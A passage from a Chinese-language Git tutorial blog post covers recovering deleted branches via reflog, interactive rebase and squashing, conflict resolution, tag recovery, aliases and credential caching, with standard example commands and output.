<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout -b my-branch</span><br><span class="line">(my-branch)$ git branch</span><br><span class="line">(my-branch)$ touch foo.txt</span><br><span class="line">(my-branch)$ ls</span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure>

<p>添加文件并做一次提交</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git add .</span><br><span class="line">(my-branch)$ git commit -m <span class="string">'foo.txt added'</span></span><br><span class="line">(my-branch)$ foo.txt added</span><br><span class="line"> 1 files changed, 1 insertions(+)</span><br><span class="line"> create mode 100644 foo.txt</span><br><span class="line">(my-branch)$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">commit 4e3cd85a670ced7cc17a2b5d8d3d809ac88d5012</span><br><span class="line">Author: siemiatj &lt;siemiatj@example.com&gt;</span><br><span class="line">Date:   Wed Jul 30 00:34:10 2014 +0200</span><br><span class="line"></span><br><span class="line">    foo.txt added</span><br><span class="line"></span><br><span class="line">commit 69204cdf0acbab201619d95ad8295928e7f411d5</span><br><span class="line">Author: Kate Hudson &lt;katehudson@example.com&gt;</span><br><span class="line">Date:   Tue Jul 29 13:14:46 2014 -0400</span><br><span class="line"></span><br><span class="line">    Fixes <span class="comment">#6: Force pushing after amending commits</span></span><br></pre></td></tr></table></figure>

<p>现在我们切回到主(master)分支，‘不小心的’删除<code>my-branch</code>分支</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git checkout master</span><br><span class="line">Switched to branch <span class="string">'master'</span></span><br><span class="line">Your branch is up-to-date with <span class="string">'origin/master'</span>.</span><br><span class="line">(master)$ git branch -D my-branch</span><br><span class="line">Deleted branch my-branch (was 4e3cd85).</span><br><span class="line">(master)$ <span class="built_in">echo</span> oh noes, deleted my branch!</span><br><span class="line">oh noes, deleted my branch!</span><br></pre></td></tr></table></figure>

<p>在这时候你应该想起了<code>reflog</code>, 一个升级版的日志，它存储了仓库(repo)里面所有动作的历史。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">69204cd HEAD@&#123;0&#125;: checkout: moving from my-branch to master</span><br><span class="line">4e3cd85 HEAD@&#123;1&#125;: commit: foo.txt added</span><br><span class="line">69204cd HEAD@&#123;2&#125;: checkout: moving from master to my-branch</span><br></pre></td></tr></table></figure>

<p>正如你所见，我们有一个来自删除分支的提交 hash(commit hash)，接下来看看是否能恢复删除了的分支。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout -b my-branch-help</span><br><span class="line">Switched to a new branch <span class="string">'my-branch-help'</span></span><br><span class="line">(my-branch-help)$ git reset --hard 4e3cd85</span><br><span class="line">HEAD is now at 4e3cd85 foo.txt added</span><br><span class="line">(my-branch-help)$ ls</span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure>

<p>看! 我们把删除的文件找回来了。 Git 的 <code>reflog</code> 在 rebasing 出错的时候也是同样有用的。</p>
<h4 id="我想删除一个分支"><a href="#我想删除一个分支" class="headerlink" title="我想删除一个分支"></a>我想删除一个分支</h4><p>删除一个远程分支:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git push origin --delete my-branch</span><br></pre></td></tr></table></figure>

<p>你也可以:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git push origin :my-branch</span><br></pre></td></tr></table></figure>

<p>删除一个本地分支:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git branch -D my-branch</span><br></pre></td></tr></table></figure>

<h4 id="我想从别人正在工作的远程分支签出-checkout-一个分支"><a href="#我想从别人正在工作的远程分支签出-checkout-一个分支" class="headerlink" title="我想从别人正在工作的远程分支签出(checkout)一个分支"></a>我想从别人正在工作的远程分支签出(checkout)一个分支</h4><p>首先, 从远程拉取(fetch) 所有分支:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git fetch --all</span><br></pre></td></tr></table></figure>

<p>假设你想要从远程的<code>daves</code>分支签出到本地的<code>daves</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout --track origin/daves</span><br><span class="line">Branch daves <span class="built_in">set</span> up to track remote branch daves from origin.</span><br><span class="line">Switched to a new branch <span class="string">'daves'</span></span><br></pre></td></tr></table></figure>

<p>(<code>--track</code> 是 <code>git checkout -b [branch] [remotename]/[branch]</code> 的简写)</p>
<p>这样就得到了一个<code>daves</code>分支的本地拷贝, 任何推过(pushed)的更新，远程都能看到.</p>
<h3 id="Rebasing-和合并-Merging"><a href="#Rebasing-和合并-Merging" class="headerlink" title="Rebasing 和合并(Merging)"></a>Rebasing 和合并(Merging)</h3><h4 id="我想撤销-rebase-merge"><a href="#我想撤销-rebase-merge" class="headerlink" title="我想撤销 rebase/merge"></a>我想撤销 rebase/merge</h4><p>你可以合并(merge)或 rebase 了一个错误的分支, 或者完成不了一个进行中的 rebase/merge。 Git 在进行危险操作的时候会把原始的 HEAD 保存在一个叫 ORIG_HEAD 的变量里, 所以要把分支恢复到 rebase/merge 前的状态是很容易的。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git reset --hard ORIG_HEAD</span><br></pre></td></tr></table></figure>

<h4 id="我已经-rebase-过-但是我不想强推-force-push"><a href="#我已经-rebase-过-但是我不想强推-force-push" class="headerlink" title="我已经 rebase 过, 但是我不想强推(force push)"></a>我已经 rebase 过, 但是我不想强推(force push)</h4><p>不幸的是，如果你想把这些变化(changes)反应到远程分支上，你就必须得强推(force push)。 是因你快进(Fast forward)了提交，改变了 Git 历史, 远程分支不会接受变化(changes)，除非强推(force push)。这就是许多人使用 merge 工作流, 而不是 rebasing 工作流的主要原因之一， 开发者的强推(force push)会使大的团队陷入麻烦。使用时需要注意，一种安全使用 rebase 的方法是，不要把你的变化(changes)反映到远程分支上, 而是按下面的做:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git checkout my-branch</span><br><span class="line">(my-branch)$ git rebase -i master</span><br><span class="line">(my-branch)$ git checkout master</span><br><span class="line">(master)$ git merge --ff-only my-branch</span><br></pre></td></tr></table></figure>

<p>更多, 参见 <a href="http://stackoverflow.com/questions/11058312/how-can-i-use-git-rebase-without-requiring-a-forced-push" target="_blank" rel="noopener">this SO thread</a>.</p>
<h4 id="我需要组合-combine-几个提交-commit"><a href="#我需要组合-combine-几个提交-commit" class="headerlink" title="我需要组合(combine)几个提交(commit)"></a>我需要组合(combine)几个提交(commit)</h4><p>假设你的工作分支将会做对于 <code>master</code> 的 pull-request。 一般情况下你不关心提交(commit)的时间戳，只想组合 <em>所有</em> 提交(commit) 到一个单独的里面, 然后重置(reset)重提交(recommit)。 确保主(master)分支是最新的和你的变化都已经提交了, 然后:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git reset --soft master</span><br><span class="line">(my-branch)$ git commit -am <span class="string">"New awesome feature"</span></span><br></pre></td></tr></table></figure>

<p>如果你想要更多的控制, 想要保留时间戳, 你需要做交互式 rebase (interactive rebase):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git rebase -i master</span><br></pre></td></tr></table></figure>

<p>如果没有相对的其它分支， 你将不得不相对自己的<code>HEAD</code> 进行 rebase。 例如：你想组合最近的两次提交(commit), 你将相对于<code>HEAD\~2</code> 进行 rebase， 组合最近 3 次提交(commit), 相对于<code>HEAD\~3</code>, 等等。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git rebase -i HEAD~2</span><br></pre></td></tr></table></figure>

<p>在你执行了交互式 rebase 的命令(interactive rebase command)后, 你将在你的编辑器里看到类似下面的内容:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line">pick b729ad5 fixup</span><br><span class="line">pick e3851e8 another <span class="keyword">fix</span></span><br><span class="line"></span><br><span class="line">## Rebase <span class="number">8074</span>d12..b729ad5 onto <span class="number">8074</span>d12</span><br><span class="line">#</span><br><span class="line">## Command<span class="variable">s:</span></span><br><span class="line">##  <span class="keyword">p</span>, pick = use commit</span><br><span class="line">##  r, reword = use commit, but <span class="keyword">edit</span> the commit message</span><br><span class="line">##  <span class="keyword">e</span>, <span class="keyword">edit</span> = use commit, but <span class="keyword">stop</span> <span class="keyword">for</span> amending</span><br><span class="line">##  s, squash = use commit, but meld into <span class="keyword">previous</span> commit</span><br><span class="line">##  <span class="keyword">f</span>, fixup = like <span class="string">"squash"</span>, but discard this commit<span class="string">'s log message</span></span><br><span class="line"><span class="string">##  x, exec = run command (the rest of the line) using shell</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">## These lines can be re-ordered; they are executed from top to bottom.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">## If you remove a line here THAT COMMIT WILL BE LOST.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">## However, if you remove everything, the rebase will be aborted.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">## Note that empty commits are commented out</span></span><br></pre></td></tr></table></figure>

<p>所有以 <code>#</code> 开头的行都是注释, 不会影响 rebase.</p>
<p>然后，你可以用任何上面命令列表的命令替换 <code>pick</code>, 你也可以通过删除对应的行来删除一个提交(commit)。</p>
<p>例如, 如果你想 <strong>单独保留最旧(first)的提交(commit),组合所有剩下的到第二个里面</strong>, 你就应该编辑第二个提交(commit)后面的每个提交(commit) 前的单词为 <code>f</code>:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line"><span class="keyword">f</span> b729ad5 fixup</span><br><span class="line"><span class="keyword">f</span> e3851e8 another <span class="keyword">fix</span></span><br></pre></td></tr></table></figure>

<p>如果你想组合这些提交(commit) <strong>并重命名这个提交(commit)</strong>, 你应该在第二个提交(commit)旁边添加一个<code>r</code>，或者更简单的用<code>s</code> 替代 <code>f</code>:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line">s b729ad5 fixup</span><br><span class="line">s e3851e8 another <span class="keyword">fix</span></span><br></pre></td></tr></table></figure>

<p>你可以在接下来弹出的文本提示框里重命名提交(commit)。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Newer, awesomer features</span><br><span class="line"></span><br><span class="line">## Please enter the commit message <span class="keyword">for</span> your <span class="keyword">changes</span>. Lines starting</span><br><span class="line">## with <span class="string">'#'</span> will <span class="keyword">be</span> ignored, <span class="built_in">and</span> <span class="keyword">an</span> <span class="built_in">empty</span> message aborts the commit.</span><br><span class="line">## rebase in progress; onto 8074d12</span><br><span class="line">## You are currently editing <span class="keyword">a</span> commit <span class="keyword">while</span> rebasing branch <span class="string">'master'</span> <span class="keyword">on</span> <span class="string">'8074d12'</span>.</span><br><span class="line">#</span><br><span class="line">## Changes <span class="keyword">to</span> <span class="keyword">be</span> committed:</span><br><span class="line">#	modified:   README.md</span><br><span class="line">#</span><br></pre></td></tr></table></figure>

<p>如果成功了, 你应该看到类似下面的内容:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ Successfully rebased and updated refs/heads/master.</span><br></pre></td></tr></table></figure>

<h5 id="安全合并-merging-策略"><a href="#安全合并-merging-策略" class="headerlink" title="安全合并(merging)策略"></a>安全合并(merging)策略</h5><p><code>--no-commit</code> 执行合并(merge)但不自动提交, 给用户在做提交前检查和修改的机会。 <code>no-ff</code> 会为特性分支(feature branch)的存在过留下证据, 保持项目历史一致。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git merge --no-ff --no-commit my-branch</span><br></pre></td></tr></table></figure>

<h5 id="我需要将一个分支合并成一个提交-commit"><a href="#我需要将一个分支合并成一个提交-commit" class="headerlink" title="我需要将一个分支合并成一个提交(commit)"></a>我需要将一个分支合并成一个提交(commit)</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git merge --squash my-branch</span><br></pre></td></tr></table></figure>

<h5 id="我只想组合-combine-未推的提交-unpushed-commit"><a href="#我只想组合-combine-未推的提交-unpushed-commit" class="headerlink" title="我只想组合(combine)未推的提交(unpushed commit)"></a>我只想组合(combine)未推的提交(unpushed commit)</h5><p>有时候，在将数据推向上游之前，你有几个正在进行的工作提交(commit)。这时候不希望把已经推(push)过的组合进来，因为其他人可能已经有提交(commit)引用它们了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git rebase -i @&#123;u&#125;</span><br></pre></td></tr></table></figure>

<p>这会产生一次交互式的 rebase(interactive rebase), 只会列出没有推(push)的提交(commit)， 在这个列表时进行 reorder/fix/squash 都是安全的。</p>
<h4 id="检查是否分支上的所有提交-commit-都合并-merge-过了"><a href="#检查是否分支上的所有提交-commit-都合并-merge-过了" class="headerlink" title="检查是否分支上的所有提交(commit)都合并(merge)过了"></a>检查是否分支上的所有提交(commit)都合并(merge)过了</h4><p>检查一个分支上的所有提交(commit)是否都已经合并(merge)到了其它分支, 你应该在这些分支的 head(或任何 commits)之间做一次 diff:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span> --graph --left-right --cherry-pick --oneline HEAD...feature/120-on-scroll</span><br></pre></td></tr></table></figure>

<p>这会告诉你在一个分支里有而另一个分支没有的所有提交(commit), 和分支之间不共享的提交(commit)的列表。 另一个做法可以是:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span> master ^feature/120-on-scroll --no-merges</span><br></pre></td></tr></table></figure>

<h4 id="交互式-rebase-interactive-rebase-可能出现的问题"><a href="#交互式-rebase-interactive-rebase-可能出现的问题" class="headerlink" title="交互式 rebase(interactive rebase)可能出现的问题"></a>交互式 rebase(interactive rebase)可能出现的问题</h4><h5 id="这个-rebase-编辑屏幕出现’noop’"><a href="#这个-rebase-编辑屏幕出现’noop’" class="headerlink" title="这个 rebase 编辑屏幕出现’noop’"></a>这个 rebase 编辑屏幕出现’noop’</h5><p>如果你看到的是这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noop</span><br></pre></td></tr></table></figure>

<p>这意味着你 rebase 的分支和当前分支在同一个提交(commit)上, 或者 <em>领先(ahead)</em> 当前分支。 你可以尝试:</p>
<ul>
<li>检查确保主(master)分支没有问题</li>
<li>rebase <code>HEAD\~2</code> 或者更早</li>
</ul>
<h5 id="有冲突的情况"><a href="#有冲突的情况" class="headerlink" title="有冲突的情况"></a>有冲突的情况</h5><p>如果你不能成功的完成 rebase, 你可能必须要解决冲突。</p>
<p>首先执行 <code>git status</code> 找出哪些文件有冲突:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git status</span><br><span class="line">On branch my-branch</span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:</span><br><span class="line">  (use <span class="string">"git add &lt;file&gt;..."</span> to update what will be committed)</span><br><span class="line">  (use <span class="string">"git checkout -- &lt;file&gt;..."</span> to discard changes <span class="keyword">in</span> working directory)</span><br><span class="line"></span><br><span class="line">	modified:   README.md</span><br></pre></td></tr></table></figure>

<p>在这个例子里面, <code>README.md</code> 有冲突。 打开这个文件找到类似下面的内容:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">some code</span><br><span class="line">=========</span><br><span class="line">some code</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; <span class="keyword">new</span>-commit</span><br></pre></td></tr></table></figure>

<p>你需要解决新提交的代码(示例里, 从中间<code>==</code>线到<code>new-commit</code>的地方)与<code>HEAD</code> 之间不一样的地方.</p>
<p>有时候这些合并非常复杂，你应该使用可视化的差异编辑器(visual diff editor):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master*)$ git mergetool -t opendiff</span><br></pre></td></tr></table></figure>

<p>在你解决完所有冲突和测试过后, <code>git add</code> 变化了的(changed)文件, 然后用<code>git rebase --continue</code> 继续 rebase。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git add README.md</span><br><span class="line">(my-branch)$ git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure>

<p>如果在解决完所有的冲突过后，得到了与提交前一样的结果, 可以执行<code>git rebase --skip</code>。</p>
<p>任何时候你想结束整个 rebase 过程，回来 rebase 前的分支状态, 你可以做:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git rebase --abort</span><br></pre></td></tr></table></figure>

<h3 id="杂项-Miscellaneous-Objects"><a href="#杂项-Miscellaneous-Objects" class="headerlink" title="杂项(Miscellaneous Objects)"></a>杂项(Miscellaneous Objects)</h3><h4 id="克隆所有子模块"><a href="#克隆所有子模块" class="headerlink" title="克隆所有子模块"></a>克隆所有子模块</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive git://github.com/foo/bar.git</span><br></pre></td></tr></table></figure>

<p>如果已经克隆了:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git submodule update --init --recursive</span><br></pre></td></tr></table></figure>

<h4 id="删除标签-tag"><a href="#删除标签-tag" class="headerlink" title="删除标签(tag)"></a>删除标签(tag)</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -d &lt;tag_name&gt;</span><br><span class="line">$ git push &lt;remote&gt; :refs/tags/&lt;tag_name&gt;</span><br></pre></td></tr></table></figure>

<h4 id="恢复已删除标签-tag"><a href="#恢复已删除标签-tag" class="headerlink" title="恢复已删除标签(tag)"></a>恢复已删除标签(tag)</h4><p>如果你想恢复一个已删除标签(tag), 可以按照下面的步骤: 首先, 需要找到无法访问的标签(unreachable tag):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fsck --unreachable | grep tag</span><br></pre></td></tr></table></figure>

<p>记下这个标签(tag)的 hash，然后用 Git 的 <a href="http://git-scm.com/docs/git-update-ref" target="_blank" rel="noopener">update-ref</a>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git update-ref refs/tags/&lt;tag_name&gt; &lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这时你的标签(tag)应该已经恢复了。</p>
<h4 id="已删除补丁-patch"><a href="#已删除补丁-patch" class="headerlink" title="已删除补丁(patch)"></a>已删除补丁(patch)</h4><p>如果某人在 GitHub 上给你发了一个 pull request, 但是然后他删除了他自己的原始 fork, 你将没法克隆他们的提交(commit)或使用 <code>git am</code>。在这种情况下, 最好手动的查看他们的提交(commit)，并把它们拷贝到一个本地新分支，然后做提交。</p>
<p>做完提交后, 再修改作者，参见<a href="#commit-wrong-author">变更作者</a>。 然后, 应用变化, 再发起一个新的 pull request。</p>
<h3 id="跟踪文件-Tracking-Files"><a href="#跟踪文件-Tracking-Files" class="headerlink" title="跟踪文件(Tracking Files)"></a>跟踪文件(Tracking Files)</h3><h4 id="我只想改变一个文件名字的大小写，而不修改内容"><a href="#我只想改变一个文件名字的大小写，而不修改内容" class="headerlink" title="我只想改变一个文件名字的大小写，而不修改内容"></a>我只想改变一个文件名字的大小写，而不修改内容</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git mv --force myfile MyFile</span><br></pre></td></tr></table></figure>

<h4 id="我想从-Git-删除一个文件，但保留该文件"><a href="#我想从-Git-删除一个文件，但保留该文件" class="headerlink" title="我想从 Git 删除一个文件，但保留该文件"></a>我想从 Git 删除一个文件，但保留该文件</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git rm --cached log.txt</span><br></pre></td></tr></table></figure>

<h3 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置(Configuration)"></a>配置(Configuration)</h3><h4 id="我想给一些-Git-命令添加别名-alias"><a href="#我想给一些-Git-命令添加别名-alias" class="headerlink" title="我想给一些 Git 命令添加别名(alias)"></a>我想给一些 Git 命令添加别名(alias)</h4><p>在 OS X 和 Linux 下, 你的 Git 的配置文件储存在 <code>\~/.gitconfig</code>。我在<code>[alias]</code> 部分添加了一些快捷别名(和一些我容易拼写错误的)，如下:</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[alias]</span><br><span class="line">    <span class="keyword">a</span> = <span class="built_in">add</span></span><br><span class="line">    amend = commit --amend</span><br><span class="line">    <span class="keyword">c</span> = commit</span><br><span class="line">    <span class="keyword">ca</span> = commit --amend</span><br><span class="line">    ci = commit -<span class="keyword">a</span></span><br><span class="line">    <span class="keyword">co</span> = checkout</span><br><span class="line">    d = diff</span><br><span class="line">    dc = diff --changed</span><br><span class="line">    <span class="keyword">ds</span> = diff --staged</span><br><span class="line">    <span class="keyword">f</span> = fetch</span><br><span class="line">    loll = <span class="built_in">log</span> --graph --decorate --pretty=oneline --abbrev-commit</span><br><span class="line">    <span class="keyword">m</span> = merge</span><br><span class="line">    one = <span class="built_in">log</span> --pretty=oneline</span><br><span class="line">    outstanding = rebase -i @&#123;<span class="keyword">u</span>&#125;</span><br><span class="line">    s = status</span><br><span class="line">    unpushed = <span class="built_in">log</span> @&#123;<span class="keyword">u</span>&#125;</span><br><span class="line">    wc = whatchanged</span><br><span class="line">    wip = rebase -i @&#123;<span class="keyword">u</span>&#125;</span><br><span class="line">    zap = fetch -<span class="keyword">p</span></span><br></pre></td></tr></table></figure>

<h4 id="我想缓存一个仓库-repository-的用户名和密码"><a href="#我想缓存一个仓库-repository-的用户名和密码" class="headerlink" title="我想缓存一个仓库(repository)的用户名和密码"></a>我想缓存一个仓库(repository)的用户名和密码</h4><p>你可能有一个仓库需要授权，这时你可以缓存用户名和密码，而不用每次推/拉(push/pull)的时候都输入，Credential helper 能帮你。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global credential.helper cache</span><br><span class="line"><span class="comment">## Set git to use the credential memory cache</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global credential.helper <span class="string">'cache --timeout=3600'</span></span><br><span class="line"><span class="comment">## Set the cache to timeout after 1 hour (setting is in seconds)</span></span><br></pre></td></tr></table></figure>

<h3 id="我不知道我做错了些什么"><a href="#我不知道我做错了些什么" class="headerlink" title="我不知道我做错了些什么"></a>我不知道我做错了些什么</h3><p>你把事情搞砸了：你 <code>重置(reset)</code> 了一些东西, 或者你合并了错误的分支, 亦或你强推了后找不到你自己的提交(commit)了。有些时候, 你一直都做得很好, 但你想回到以前的某个状态。</p>
<p>这就是 <code>git reflog</code> 的目的， <code>reflog</code> 记录对分支顶端(the tip of a branch)的任何改变, 即使那个顶端没有被任何分支或标签引用。基本上, 每次 HEAD 的改变, 一条新的记录就会增加到<code>reflog</code>。遗憾的是，这只对本地分支起作用，且它只跟踪动作 (例如，不会跟踪一个没有被记录的文件的任何改变)。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">0a2e358 HEAD@&#123;0&#125;: reset: moving to HEAD\~2</span><br><span class="line">0254ea7 HEAD@&#123;1&#125;: checkout: moving from 2.2 to master</span><br><span class="line">c10f740 HEAD@&#123;2&#125;: checkout: moving from master to 2.2</span><br></pre></td></tr></table></figure>

<p>上面的 reflog 展示了从 master 分支签出(checkout)到 2.2 分支，然后再签回。 那里，还有一个硬重置(hard reset)到一个较旧的提交。最新的动作出现在最上面以 <code>HEAD@{0}</code>标识.</p>
<p>如果事实证明你不小心回移(move back)了提交(commit), reflog 会包含你不小心回移前 master 上指向的提交(0254ea7)。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard 0254ea7</span><br></pre></td></tr></table></figure>

<p>然后使用 git reset 就可以把 master 改回到之前的 commit，这提供了一个在历史被意外更改情况下的安全网。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最后，放一张我总结的脑图总结一下以上的知识点。</p>
<figure class="image-box">
                <img src="1695e1cf3cd5940f.png" alt title class>
                <p></p>
            </figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>官方资源<ul>
<li><a href="https://git-scm.com/" target="_blank" rel="noopener">Git 官网</a></li>
<li><a href="https://github.com/git/git" target="_blank" rel="noopener">Git Github</a></li>
</ul>
</li>
<li>模板<ul>
<li><a href="https://github.com/github/gitignore" target="_blank" rel="noopener">gitignore 模板</a> - .gitignore 文件模板</li>
